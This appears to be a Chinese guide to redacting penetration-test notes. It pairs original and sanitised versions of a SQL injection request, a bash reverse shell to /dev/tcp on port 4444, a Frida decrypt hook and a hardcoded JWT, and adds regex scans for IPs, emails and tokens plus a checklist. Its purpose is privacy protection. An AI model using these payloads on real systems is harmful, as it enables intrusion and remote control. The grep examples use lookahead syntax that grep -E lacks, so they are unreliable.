

|------|-------|---------|


|------|-------|
| API key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer | `{bearer_token}` |


|------|-------|


|------|-------|


|------|-------|
| UUID | `{uuid}` |


```python
# ❌ 全替换成 X，看不出语义
target = "X"
url = "X/X"

# ❌ 替换太通用
target = "{target}"
url = "{url}"

# ✅ 保留上下文
target_ip = "{target_ip}"           # 192.168.10.50
target_url = "{target_url}/admin"   # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```


### Web payload

```
原始: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
      Host: shop.victim-corp.cn
      Cookie: PHPSESSID=abcdef123456

脱敏: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
      Host: {target_domain}
      Cookie: PHPSESSID={session_id}
```

### Shell payload

```bash
# 原始
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# 脱敏
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```


```javascript
// 原始
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    ...
};

// 脱敏
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    ...
};
```


```c
// 原始
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// 脱敏
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```


```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# 公网 IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# 邮箱
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# 中国大陆手机号
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux 等价
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```


```
□ 没有公网 IP（除了 CDN / 公开服务）
□ 没有真实域名（除了 example.com 等示范域）
□ 没有真实凭证 / token / hash（已替换为 {placeholder}）
□ 没有截图里漏出的姓名 / 工号 / 邮箱
□ 没有 sample 文件本身（只留 sha256）
□ JWT / OAuth code / API key 全替换
□ 内网 IP 段已模糊到前两段（10.0.x.x）
□ Payload 里的目标参数已替换为通用占位符
□ Cookie 与 session id 已替换
```
